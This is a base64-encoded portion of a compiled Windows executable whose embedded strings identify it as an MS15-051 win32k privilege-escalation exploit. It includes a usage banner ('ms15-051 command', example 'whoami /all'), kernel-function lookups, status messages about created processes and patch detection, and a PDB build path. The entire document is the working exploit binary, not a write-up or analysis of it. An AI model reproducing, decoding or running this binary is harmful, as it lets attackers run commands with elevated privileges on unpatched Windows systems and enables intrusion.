EAAQABAAEAAQABAAEACBAYEBgQGBAYEBgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE
BAQEBAQEBEAAQABAAEAAQABAAggGCAYIBggGCAYIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQ
IBAgECAQIBAgECARAAEAAQABAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgA
CAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQ
ABAAFAAUABAAEAAQABAAEAAUABAAEAAQABAAEAAQAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE
BAQEBAQEBAQEBAQEBAQEBAQEQAAEBAQEBAQEBAQEBAQEBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAg
ECAQIBAgECAQIBAgECAQIBAgECAQIBEAACAQIBAgECAQIBAgECAQIBAQEAAAAAgIGCg4SFhoeIiYqLj
I2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbH
yMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQI
DBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT
4/QGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6W1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4e
Xp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0
tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/
w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqq
usra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5
ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAh
IiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1x
dXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5
iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS0
9TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AQIDBAUGBwgJCgsMDQ4P
EBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUp
LTE1OT1BRUlNUVVZXWFlaW1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+fwB6AGMAZw
BvAG4AdgBoAAAAUHNMb29rdXBQcm9jZXNzQnlQcm9jZXNzSWQAAFVzZXJSZWdpc3Rlcldvd0hhbmRsZ
XJzAFVTRVIzMi5kbGwAAHUAcwBlAHIAMwAyAC4AZABsAGwAAAAAAGdTaGFyZWRJbmZvAFsjXSBtczE1
LTA1MSBmaXhlZCBieSB6Y2dvbnZoCgAAWyNdIHVzYWdlOiBtczE1LTA1MSBjb21tYW5kIAoAAABbI10
gZWc6IG1zMTUtMDUxICJ3aG9hbWkgL2FsbCIgCgAAAABbeF0gdGhpcyB2ZXJzaW9uIG9mIHN5c3RlbS
B3YXMgbm90IHN1cHBvcnRlZAoAAABbeF0gcGxlYXNlIHJlLWNvbXBpbGVyIHRoaXMgcHJvZ3JhbSB2a
WEgeDY0IHBsYXRmb3JtCgAAAFt4XSBjYW4gbm90IGdldCBhZGRyZXNzIG9mIFBzTG9va3VwUHJvY2Vz
c0J5UHJvY2Vzc0lkCgAAW3hdIGNhbiBub3QgZml4IHByb3RlY3QKAAAAAAAAAABbIV0gcHJvY2VzcyB
3aXRoIHBpZDogJWQgY3JlYXRlZC4KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgAAAFt4XS
BtYXkgYmUgcGF0Y2hlZAoASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAhMJAAICsQAADAAAAUlNEUyoPQT3b2GdNrtgy7fEvvuoBAAAAQzpcVXNl
cnNcemNnXERlc2t0b3BcZmlsZXNcbXMxNS0wNTFcbXMxNS0wNTFcV2luMzJcbXMxNS0wNTEucGRiAJA
uAAAQWwAAkHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v///wAAAADM////AAAAAP7///8AAAAAAxlAAA
AAAAAAAAAAzxhAAP7///8AAAAA1P///wAAAAD+////AAAAAFUZQAAAAAAA/v///wAAAADU////AAAAA
P7///8AAAAA/BlAAAAAAAD+////AAAAAMz///8AAAAA/v///3EbQACFG0AAAAAAAP7///8AAAAA0P//
/wAAAAD+////AAAAALAgQAAAAAAA/v///wAAAADA////AAAAAP7///8AAAAAJyNAAAAAAAD+////AAA
AANT///8AAAAA/v///wAAAAAVJUAAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAABctQAAAAAAA/v
///wAAAADQ////AAAAAP7///8AAAAAFi5AAAAAAAD+////AAAAANj///8AAAAA/v///wAAAAATSUAA/
v///wAAAAAiSUAA/v///wAAAADY////AAAAAP7///8AAAAA1UpAAP7///8AAAAA4UpAAP7///8AAAAA
1P///wAAAAD+////AAAAAMJPQAAAAAAA/v///wAAAADY////AAAAAP7////tT0AA8U9AAAAAAAD+///
/AAAAAMD///8AAAAA/v///wAAAADaUUAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAI5TQAAAAA
AA/v///wAAAADY////AAAAAP7////rVEAA/lRAAAAAAAD+////AAAAAMz///8AAAAA/v///wAAAACUW
EAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAEtaQAAAAAAA/v///wAAAADU////AAAAAP7///8A
AAAAjV5AAAAAAAD+////AAAAAMz///8AAAAA/v///wAAAABfYkAAAAAAAP7///8AAAAA1P///wAAAAD
+////AAAAAONlQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAN3BAAASxAAAAAAAAAAAAAECxAA
BAkQAAxK8AAAAAAAAAAAAAcLIAAACQAADosAAAAAAAAAAAAADosgAAJJEAAAAAAAAAAAAAAAAAAAAAA
AAAAAAASrEAAFixAABksQAAeLEAAISxAACasQAArrEAAMCxAADSsQAA6LEAAP6xAAAQsgAAIrIAADay
AABIsgAAWrIAAPi2AADotgAA1rYAAMi2AAC6tgAArrYAAJy2AACQtgAAALMAABizAAAwswAAQrMAAFi
zAABsswAAiLMAAKazAAC6swAAzLMAANyzAAAEtAAAErQAACS0AAA8tAAARLQAAFS0AABitAAAcrQAAH
60AACUtAAApLQAALa0AADKtAAA2rQAAPC0AAAGtQAAILUAADq1AABGtQAAVLUAAGK1AABstQAAhLUAA
JS1AACqtQAAwrUAANC1AADqtQAA+rUAABS2AAAitgAAMrYAAEK2AABYtgAAarYAAHq2AACGtgAAAAAA
ANSyAADAsgAAtLIAAKKyAAB+sgAAkLIAAAAAAAD0sgAAMLEAABSxAAAAAAAApgFOdFF1ZXJ5U3lzdGV
tSW5mb3JtYXRpb24AAHkDUnRsR2V0VmVyc2lvbgBudGRsbC5kbGwAYgFGcmVlTGlicmFyeQDLAkhlYX
BBbGxvYwDAAUdldEN1cnJlbnRQcm9jZXNzAM8CSGVhcEZyZWUAAPkEV2FpdEZvclNpbmdsZU9iamVjd
AAYAkdldE1vZHVsZUhhbmRsZVcAAEoCR2V0UHJvY2Vzc0hlYXAAAKQAQ3JlYXRlUHJvY2Vzc0EAAG8C
R2V0U3lzdGVtRGlyZWN0b3J5QQDsAkludGVybG9ja2VkRXhjaGFuZ2UARQJHZXRQcm9jQWRkcmVzcwA
ADgNJc1dvdzY0UHJvY2VzcwAAFQJHZXRNb2R1bGVIYW5kbGVBAAA9A0xvYWRMaWJyYXJ5RXhBAADvBF
ZpcnR1YWxQcm90ZWN0AADBAUdldEN1cnJlbnRQcm9jZXNzSWQAS0VSTkVMMzIuZGxsAACcAERlZldpb
mRvd1Byb2NXAABuAENyZWF0ZVdpbmRvd0V4VwDEAlNldFdpbmRvd0xvbmdXAADtAUxvYWRJY29uVwBN
AlJlZ2lzdGVyQ2xhc3NFeFcAAAYDVW5yZWdpc3RlckNsYXNzVwAAVVNFUjMyLmRsbAAAxwRSdGxVbnd
pbmQA7gBFbnRlckNyaXRpY2FsU2VjdGlvbgAAOQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAhgFHZXRDb2
1tYW5kTGluZUEA0wJIZWFwU2V0SW5mb3JtYXRpb24AAMAEVGVybWluYXRlUHJvY2VzcwAA0wRVbmhhb
mRsZWRFeGNlcHRpb25GaWx0ZXIAAKUEU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAADSXNEZWJ1
Z2dlclByZXNlbnQAbwRTZXRIYW5kbGVDb3VudAAAZAJHZXRTdGRIYW5kbGUAAOMCSW5pdGlhbGl6ZUN
yaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudADzAUdldEZpbGVUeXBlAGMCR2V0U3RhcnR1cEluZm9XAN
EARGVsZXRlQ3JpdGljYWxTZWN0aW9uALIEU2xlZXAAAgJHZXRMYXN0RXJyb3IAABkBRXhpdFByb2Nlc
3MAygBEZWNvZGVQb2ludGVyACUFV3JpdGVGaWxlABEFV2lkZUNoYXJUb011bHRpQnl0ZQCaAUdldENv
bnNvbGVDUAAArAFHZXRDb25zb2xlTW9kZQAAVwFGbHVzaEZpbGVCdWZmZXJzAADqAEVuY29kZVBvaW5
0ZXIAFAJHZXRNb2R1bGVGaWxlTmFtZVcAABMCR2V0TW9kdWxlRmlsZU5hbWVBAABhAUZyZWVFbnZpcm
9ubWVudFN0cmluZ3NXANoBR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAxQRUbHNBbGxvYwAAxwRUbHNHZ
XRWYWx1ZQDIBFRsc1NldFZhbHVlAMYEVGxzRnJlZQDvAkludGVybG9ja2VkSW5jcmVtZW50AABzBFNl
dExhc3RFcnJvcgAAxQFHZXRDdXJyZW50VGhyZWFkSWQAAOsCSW50ZXJsb2NrZWREZWNyZW1lbnQAAM0
CSGVhcENyZWF0ZQAApwNRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgCTAkdldFRpY2tDb3VudAAAeQJHZX
RTeXN0ZW1UaW1lQXNGaWxlVGltZQDSAkhlYXBSZUFsbG9jAD8DTG9hZExpYnJhcnlXAAAkBVdyaXRlQ
29uc29sZVcAZwNNdWx0aUJ5dGVUb1dpZGVDaGFyAGYEU2V0RmlsZVBvaW50ZXIAAIcEU2V0U3RkSGFu
ZGxlAAByAUdldENQSW5mbwBoAUdldEFDUAAANwJHZXRPRU1DUAAACgNJc1ZhbGlkQ29kZVBhZ2UA1AJ
IZWFwU2l6ZQAAUgBDbG9zZUhhbmRsZQCPAENyZWF0ZUZpbGVXAGkCR2V0U3RyaW5nVHlwZVcAAC0DTE
NNYXBTdHJpbmdXAAAEA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA20AAAAAAAMDbQAABAQAAAAAAA
AAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAIAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAA
AAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAE7mQLuxGb9EAAAAAP////+ACgAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAA
AABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEA
AAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAA
AAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADskUAA3JFAAAEAAAAWAAAAAgAA
AAIAAAADAAAAAgAAAAQAAAAYAAAABQAAAA0AAAAGAAAACQAAAAcAAAAMAAAACAAAAAwAAAAJAAAADAA
AAAoAAAAHAAAACwAAAAgAAAAMAAAAFgAAAA0AAAAWAAAADwAAAAIAAAAQAAAADQAAABEAAAASAAAAEg
AAAAIAAAAhAAAADQAAADUAAAACAAAAQQAAAA0AAABDAAAAAgAAAFAAAAARAAAAUgAAAA0AAABTAAAAD
QAAAFcAAAAWAAAAWQAAAAsAAABsAAAADQAAAG0AAAAgAAAAcAAAABwAAAByAAAACQAAAAYAAAAWAAAA
gAAAAAoAAACBAAAACgAAAIIAAAAJAAAAgwAAABYAAACEAAAADQAAAJEAAAApAAAAngAAAA0AAAChAAA
AAgAAAKQAAAALAAAApwAAAA0AAAC3AAAAEQAAAM4AAAACAAAA1wAAAAsAAAAYBwAADAAAAAwAAAAIAA
AA//////////8xdEAAMXRAADF0QAAxdEAAMXRAADF0QAAxdEAAMXRAADF0QAAxdEAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
AAAAAAAAgICAgICAgICAgICAgICAgICAgICAgICAgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGFiY2RlZmd
oaWprbG1ub3BxcnN0dXZ3eHl6AAAAAAAAQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAAAAAAAAAgICAgICAgICAgIC
AgICAgICAgICAgICAgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABhYmNkZWZnaGlqa2xtbm9wcX
JzdHV2d3h5egAAAAAAAEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKDFQAA
BAgQIpAMAAGCCeYIhAAAAAAAAAKbfAAAAAAAAoaUAAAAAAACBn+D8AAAAAEB+gPwAAAAAqAMAAMGj2q
MgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACB/gAAAAAAAED+AAAAAAAAtQMAAMGj2qMgAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAACB/gAAAAAAAEH+AAAAAAAAtgMAAM+i5KIaAOWi6KJbAAAAAAAAAAAAAAAAAAAA
AACB/gAAAAAAAEB+of4AAAAAUQUAAFHaXtogAF/aatoyAAAAAAAAAAAAAAAAAAAAAACB09je4PkAADF
+gf4AAAAA/v///0MAAAB8oEAAeKBAAHSgQABwoEAAbKBAAGigQABkoEAAXKBAAFSgQABMoEAAQKBAAD
SgQAAsoEAAIKBAABygQAAYoEAAFKBAABCgQAAMoEAACKBAAASgQAAAoEAA/J9AAPifQAD0n0AA8J9AA
OifQADcn0AA1J9AAMyfQAAMoEAAxJ9AALyfQAC0n0AAqJ9AAKCfQACUn0AAiJ9AAISfQACAn0AAdJ9A
AGCfQABUn0AACQQAAAEAAAAAAAAATJ9AAESfQAA8n0AANJ9AACyfQAAkn0AAHJ9AAAyfQAD8nkAA7J5
AANieQADEnkAAtJ5AAKCeQACYnkAAkJ5AAIieQACAnkAAeJ5AAHCeQABonkAAYJ5AAFieQABQnkAASJ
5AAECeQAAwnkAAHJ5AABCeQAAEnkAAeJ5AAPidQADsnUAA3J1AAMidQAC4nUAApJ1AAJCdQACInUAAg
J1AAGydQABEnUAAMJ1AAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxMpAAAAAAAAAAAA
AAAAAAMTKQAAAAAAAAAAAAAAAAADEykAAAAAAAAAAAAAAAAAAxMpAAAAAAAAAAAAAAAAAAMTKQAAAAA
AAAAAAAAAAAAABAAAAAQAAAAAAAAAAAAAAAAAAAEjNQAAAAAAAAAAAAGiiQADwpkAAcKhAAMjKQAAwz
EAAAAAAAAIAAAAAAAAAAAAAAAAAAAD+////AAAAAAAAAAAAAAAAIAWTGQAAAAAAAAAAAAAAAC4AAAAu
AAAAQM1AADTaQAA02kAANNpAADTaQAA02kAANNpAADTaQAA02kAANNpAAH9/f39/f39/RM1AADjaQAA
42kAAONpAADjaQAA42kAAONpAADjaQABIzUAAaKJAAGqkQAAAAAAAAAAAAAAAAABspEAAAQAAAC4AAA
ABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAABAAAAAAAAQABAAAAMAAAgAAA
AAAAAAAABAAAAAAAAQAJBAAASAAAAFjwAABaAQAA5AQAAAAAAAA8YXNzZW1ibHkgeG1sbnM9InVybjp
zY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDx0cn
VzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2Vjd
XJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1
dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSI+PC9yZXF1ZXN0ZWRFeGV
jdXRpb25MZXZlbD4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg
0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+UEFQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFER
ElOR1BBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFEABAAAHQBAAAKMCow
MTBMMF8wZjCpMNow4TDyMP0wBDEQMSwxMzFTMVgxXjFkMWwxdDF9McIx3zEYMiEyOjJKMlMyaTKEMoo
ykjKhMqsysjLNMvIyIjMnMzozRDNbM2UzejORM5gzpDPJM84z2DPhMyk0LzRANEY0ZDRpNG80eDScNK
E0qDTGNMw00jQqNTQ1VzVeNXc1mzXANc411DXuNf01CjYWNiY2LTY8Nkg2VTZ5Nos2mTauNrg23jYRN
yA3KTdNN3w3NThYOGM4hjjVOA85azkQOhs6LDpROl46azp3OoM6iTqbOqM6rjr1Ovo6BDs+O0M7SjtQ
O8U7yzvRO9c73TvjO+o78Tv4O/87BjwNPBQ8HDwkPCw8ODxBPEY8TDxWPF88ajx2PHs8izyQPJY8nDy
yPLk8zjz0PPo8JD1pPXA9hT3MPdY9AT4ZPjc+Wz6LPp0+yz7uPvQ+Hj8nPzM/aj9zP38/uD/BP80/9T
/7PwAAACAAALQAAAANMCAwQTBKMHEwfjCDMJEwvzDFMM4w1TD3MGwxdDGHMZIxlzGpMbMxuDHUMd4x9
DH/MRkyJDIsMjwyQjJTMowyljK8MsMy3TLkMg8zqzOyM7wzzjPlM/Mz+TMcNCM0PDRQNFY0XzRyNJY0
1jQqNUo1YTXANWM2gzZzN5w39TdjOT06DTs+O1Q7lTu0O1E8gzyrPEs9dT2VPcs91T0xPk4+oj58P4Q
/nD+3PwAAADAAAFwAAAAOMFswbTAZMSExNjFBMRcyujLYMv4yXjNtM4gznTaTNyc5ajmWObc5mzvzPf
c9+z3/PQM+Bz4LPg8+HD4uPg4/GD8lP2M/aj93P30/uj/WP/k/AAAAQAAAMAEAAAwwezCBMJUwqDC6M
AExGTEjMT4xRjFMMVoxjjGbMbAx4TH+MUoyeDLiM/EzKTQzNHQ0fzSJNJo0pTRlNnY2fjaENok2jzb7
NgE3HTdFN5E3nTesN7E30jfXN/g3/zcLOBE4HTgjOCw4Mjg7OEc4TThVOFs4ZzhtOHo4hDiKOJQ4tjj
LOPE4MTk3OWE5ZzltOYM5mznBOTs6XjpoOqA6qDrxOvc6DTsSOxo7IDsnOy07NDs6O0I7STtOO1Y7Xz
trO3A7dTt7O387hTuKO5A7lTukO7o7wDvIO8071TvaO+I75zvuO/07AjwIPBE8MTw3PE88czx/PI88s
jy/PMs80zzbPOc8ED0YPSM9Oz1qPXA9fz38PQI+DD56PoA+jD7DPts+XD/QPwAAAFAAAMwAAAAHMA0w
EjAgMCUwKjAvMD8wbjB0MHwwwzDIMAIxBzEOMRMxGjEfMS0xjjGXMZ0xJTI0MkMyUDJWMnsygjKKMvo
y/zIIMxczOjM/M0QzWzOzM7kzvzNoNG00fzSdNLE0tzQkNTE1UDX4NWY2+zYeN3M3gDeZN7c38zcbON
448TgJOSk5fDmkOb052TkGOjM6PjpsOno6lTqhOqw7NDxxPIg8+D0JPkM+UD5aPmg+cT57Pq8+uj7EP
t0+5z76Ph4/VT+KP50/AGAAAJwAAAANMCowczDiMAExdjGCMZUxpzHCMcox0jHpMQIyHjInMi0yNjI7
MkoycTKaMqsyvzILM1ozojP2M7k05zRfNXk1ijXDNfM2+jb1OBM5IDqDOqY6sTq3Osc6zDrdOuU66zr
1Ovs6BTsLOxU7HjspOy47NztBO0w7hzuhO7s7vT3EPco91j7cPvk+Nj9AP1g/gT+zP9s/AHAAALgAAA
CGMNowDDEkMSsxMzE4MTwxQDFpMY8xrTG0MbgxvDHAMcQxyDHMMdAxGjIgMiQyKDIsMpIynTK4Mr8yx
DLIMswy7TIXM0kzUDNUM1gzXDNgM2QzaDNsM7YzvDPAM8QzyDNJNE80VDRaNGs0fDThNO00ZTV/NYg1
sDX5NZI2YjfcN/83mDiDPJU8pzy5PMs88TwDPRU9Jz05PUs9XT1vPYE9kz2lPbc9yT3gPeA+5T4AAAC
AAAAMAAAA5jEAAACQAABIAAAAXDFgMWQxaDFsMXgxfDGsMbAx3DrkOuw69Dr8OgQ7DDsUOxw7JDssOz
Q7PDtEO0w7VDtcO2Q7bDt0O3w7hDsAAACgAABEAAAAHDwgPLg8xDzgPAA9HD0gPUA9YD2APaA9wD3gP
ew9CD4UPjA+TD5QPnA+kD6sPrA+0D7wPhA/MD9QP3A/AMAAABQBAAAAMAgw8DP0M3A1dDV4NXw1gDWE
NYg1jDWQNZQ1yDnIOsw60DrUOtg63DrgOuQ66DrsOvA69Dr4Ovw6ADsEOwg7DDsQOxQ7GDscOyA7JDs
oOyw7MDs0Ozg7PDtAO0Q7SDtMO1A7VDtYO1w7YDtkO2g7bDtwO4A7hDuIO4w7kDuUO5g7nDugO6Q7qD
usO7A7tDu4O7w7wDvEO8g7zDvQO9Q72DvcO+A75DvoO+w78Dv0O/g7/DsAPAQ8CDwMPBA8FDwYPBw8I
DwkPCg8iDyYPKg8uDzIPOw8+Dz8PAA9BD0IPUg9TD1QPVQ9WD1cPWA9ZD1oPWw9eD18PYA9hD2IPYw9
kD2UPZg9nD2gPbA9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
